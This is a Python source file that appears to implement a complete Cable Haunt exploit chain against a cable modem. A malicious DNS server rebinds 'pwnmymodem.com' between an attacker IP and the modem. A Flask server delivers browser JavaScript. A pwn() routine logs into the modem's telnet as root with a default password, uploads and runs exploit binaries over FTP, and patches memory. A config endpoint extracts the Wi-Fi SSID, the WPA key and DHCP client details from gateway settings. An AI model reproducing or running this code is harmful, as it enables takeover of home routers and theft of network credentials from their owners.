import logging
import socket
from dnslib import DNSRecord, DNSQuestion, RR, A, AAAA, MX, QTYPE
import binascii
from typing import Dict
from flask import Flask
import requests
from flask import request
from flask import Response
import threading
from flask import send_from_directory
from flask_cors import CORS
from uuid import uuid4
from pwn import *
import re
from flask import jsonify
from ftplib import FTP

dom = 'pwnmymodem.com'
attackIP = '192.168.0.10'
modemIP = '192.168.0.1'

#to do:
def pwn(ip):
    telnet = remote(ip, 23)
    telnet.recvuntil('login: ', drop=True)
    telnet.send('root\n')
    telnet.sendafter(b'Password: ', 'broadcom\n')
    telnet.sendafter(b'~ # ', b'tcpsvd -vE 0.0.0.0 21 ftpd -w /apps/usr/local/sbin\n')
    telnet.recvuntil(b'starting\r\n', drop=True)

    ftp = FTP(ip)
    ftp.login()
    with open('./mipsTelnet', 'rb') as fp:
        ftp.storbinary('STOR mipsTelnet', fp)
    with open('./exploitCableHauntTC7230', 'rb') as fp:
        ftp.storbinary('STOR exploitCableHauntTC7230', fp)
    telnet.send(b'\x03')
    print(b'cd /apps/usr/local/sbin\n')
    telnet.sendafter(b' # ', b'cd /apps/usr/local/sbin\n')
    telnet.sendafter(b' # ', b'./exploitCableHauntTC7230\n')
    print(b'./exploitCableHauntTC7230\n')
    telnet.sendafter(b' # ', b'./mipsTelnet 192.168.100.1\n')
    print(b'./mipsTelnet 192.168.100.1\n')
    telnet.sendafter(b'Login: ', b'askey\n')
    print(b'askey\n')
    telnet.sendafter(b'a', b'\n')
    print(b'\n')

    telnet.sendafter(b'Password: ', b'askey\n')
    telnet.send(b'\n')
    telnet.sendafter(b'Console>', b'/system/diag writemem 0x8066fefb 0x02\n')
    telnet.send(b'\n')

    telnet.interactive()


app = Flask(__name__)
cors = CORS(app)
log = logging.getLogger('udp_server')
soc: socket

def webserver(state):
    app.config['STATE'] = state
    app.run(host='0.0.0.0', port=80, use_reloader=False, debug=True)

class SharedState():
    def __init__(self):
        self.lock = threading.Lock()
        self.state = dict()

    def get(self, key):
        with self.lock:
            return self.state.get(key)

    def set(self, key, value):
        with self.lock:
            self.state[key] = value

@app.route('/')
def home():
    return app.send_static_file('./index.html')

@app.route('/exploit.js')
def loopJS():
    state = app.config['STATE']
    ip = request.remote_addr
    state.set(ip, True)
    print(ip)
    print(state.get(ip))
    return app.send_static_file('./loop.js')

@app.route('/ok', methods=['POST'])
def ok():
    data = request.values
    ip = data['local_ip']
    print(ip)
    state.set(ip, False)
    pwn(ip)
    return jsonify({'status': 'ok'})

@app.route('/config', methods=['POST'])
def config():
    data = request.data
    fileName = '/tmp/' + str(uuid4()) + "_gatewaysettings.bin"
    with open(fileName, 'wb') as f:
        f.write(data)

    p = process(['/usr/local/bin/bcm2cfg', 'get', fileName ,'bcmwifi.ssid'])
    result = p.recvall()
    result: bytes = result.replace(b'failed to parse group firewall\n', b'')
    result: str = result.decode('ascii')
    ssid = result.split('= ')[1][1:-2]

    p = process(['/usr/local/bin/bcm2cfg', 'get', fileName ,'bcmwifi.wpa_psk'])
    result = p.recvall()
    result: bytes = result.replace(b'failed to parse group firewall\n', b'')
    result: str = result.decode('ascii')
    wpa = result.split('= ')[1][1:-2]

    dhcp = {}
    for i in range(0, 255):
        p = process(['/usr/local/bin/bcm2cfg', 'get', fileName ,'dhcp.lan_addrs.' + str(i) + '.mac'])
        result = p.recvall()
        if b'error: requested non-existing member' in result:
            break
        result: bytes = result.replace(b'failed to parse group firewall\n', b'')
        result: str = result.decode('ascii') #'dhcp.lan_addrs.0.mac = 9C:B6:D0:D3:5C:37\n'
        mac = result.split('= ')[1][:-1]     
        p = process(['/usr/local/bin/bcm2cfg', 'get', fileName ,'dhcp.lan_addrs.' + str(i) + '.ip'])
        result = p.recvall()
        result: bytes = result.replace(b'failed to parse group firewall\n', b'')
        result: str = result.decode('ascii') #'dhcp.lan_addrs.0.mac = 9C:B6:D0:D3:5C:37\n'
        ip = result.split('= ')[1][:-1]
        p = process(['/usr/local/bin/bcm2cfg', 'get', fileName ,'dhcp.lan_addrs.' + str(i) + '.hostname'])
        result = p.recvall()
        result: bytes = result.replace(b'failed to parse group firewall\n', b'')
        result: str = result.decode('ascii') #'dhcp.lan_addrs.0.mac = 9C:B6:D0:D3:5C:37\n'
        hostname = result.split('= ')[1][1:-2]
        p = process(['/usr/local/bin/bcm2cfg', 'get', fileName ,'dhcp.lan_addrs.' + str(i) + '.client_id'])
        result = p.recvall()
        result: bytes = result.replace(b'failed to parse group firewall\n', b'')
        result: str = result.decode('ascii') #'dhcp.lan_addrs.0.mac = 9C:B6:D0:D3:5C:37\n'
        clientId = result.split('= ')[1][:-1]
        dhcp[i] = {'mac': mac, 'ip': ip, 'hostname': hostname, 'client_id': clientId}

    #print(dhcp)
    return jsonify({'ssid': ssid, 'wpa_psk': wpa, 'dhcp': dhcp})

def udp_server(host='0.0.0.0', port=53):
    global soc
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    log.info("Listening on udp %s:%s" % (host, port))
    soc.bind((host, port))
    while True:
        (data, addr) = soc.recvfrom(128*1024)
        yield data, addr

if __name__ == '__main__':
    state = SharedState()
    web_thread = threading.Thread(target=webserver, args=(state,))
    web_thread.start()

    FORMAT_CONS = '%(asctime)s %(name)-12s %(levelname)8s\t%(message)s'
    logging.basicConfig(level=logging.DEBUG, format=FORMAT_CONS)

    for packet,addr in udp_server():
        if state.get(addr[0]) is None:
            state.set(addr[0], False)
        dnsRecord: DNSRecord = DNSRecord.parse(packet)
        domains = domains = ['.'.join([x.decode("utf-8") for x in q.qname.label]) for q in dnsRecord.questions]
        ans = dnsRecord.reply()
        for q in dnsRecord.questions:
            domain = '.'.join([x.decode("utf-8") for x in q.qname.label])
            print(domain)
            print(dnsRecord)
            if dom in domain:
                print(addr[0])
                print(state.get(addr[0]))
                if not state.get(addr[0]):
                    a = RR(domain, rclass=q.qclass, rtype=QTYPE.A, ttl=0, rdata=A(attackIP))
                else:
                    a = RR(domain, rclass=q.qclass, rtype=QTYPE.A, ttl=0, rdata=A(modemIP))
                ans.add_answer(a)
            else:
                res: DNSRecord = DNSRecord.parse(DNSRecord(q=q).send('8.8.8.8'))
                res = DNSRecord(rr=[])
                
                for r in res.rr:
                    ans.add_answer(r)
            print(ans)
        soc.sendto(ans.pack(), addr)
